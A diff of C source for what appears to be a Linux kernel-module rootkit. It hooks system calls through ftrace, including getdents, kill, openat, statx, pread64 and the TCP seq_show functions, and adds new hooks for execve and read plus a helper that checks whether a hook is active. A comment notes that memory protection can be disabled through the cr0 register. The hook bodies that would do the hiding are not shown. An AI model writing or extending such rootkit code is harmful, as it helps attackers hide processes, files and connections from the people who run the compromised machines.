@@ -19,7 +19,7 @@ So, even if it's not possible to optimize this particular probepoint, there'll b
 Hooking is also achievable with changing the cr0 register to disable memory protection make the memory writable
 */
 
-const int ACTIVE_HOOKS_SIZE = 14; /*Available number of hooks to store*/
+const int ACTIVE_HOOKS_SIZE = 16; /*Available number of hooks to store*/
 
 #ifdef PTREGS_SYSCALL_STUB
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions, can be long even for int ret*/
@@ -29,7 +29,9 @@ ptregs_t orig_getdents;
 ptregs_t orig_reboot;
 ptregs_t orig_openat;
 ptregs_t orig_statx;
+ptregs_t orig_execve;
 static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
+static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
 #else
 // remove arg names for definitions
 static asmlinkage int (*orig_kill)(pid_t pid, int sig);
@@ -39,6 +41,8 @@ static asmlinkage int (*orig_reboot)(int magic, int magic2, int cmd, void *arg);
 static asmlinkage int (*orig_openat)(int dfd, const char *filename, int flags, umode_t mode);
 static asmlinkage int (*orig_statx)(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf);
 static asmlinkage ssize_t (*orig_pread64)(unsigned int fd, char *buf, size_t count, loff_t pos);
+static asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
+static asmlinkage int (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
 #endif
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
@@ -230,7 +234,7 @@ void fh_remove_hook(struct ftrace_hook *hook)
  * and then call the fh_install_hook/fh_remove_hook on the function
  */
 
-int switch_hook(struct ftrace_hook *hooks, size_t count, char *symbol){
+static int switch_hook(struct ftrace_hook *hooks, size_t count, char *symbol){
 	int err;
 	size_t i;
 
@@ -259,7 +263,27 @@ error:
 	return err;
 
 }
- 
+
+
+static int is_hook_activated(struct ftrace_hook *hooks, size_t count, char *symbol){
+	size_t i;
+
+	for (i = 0; i < count; i++)
+	{
+		if(strcmp(hooks[i].name, symbol) == 0){
+			if(hooks[i].activated == 1){
+				return 0;
+			}
+
+			else{
+				return 1;
+			}
+		}
+	}
+	return 1;
+}
+
+
 void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 {
 	size_t i;
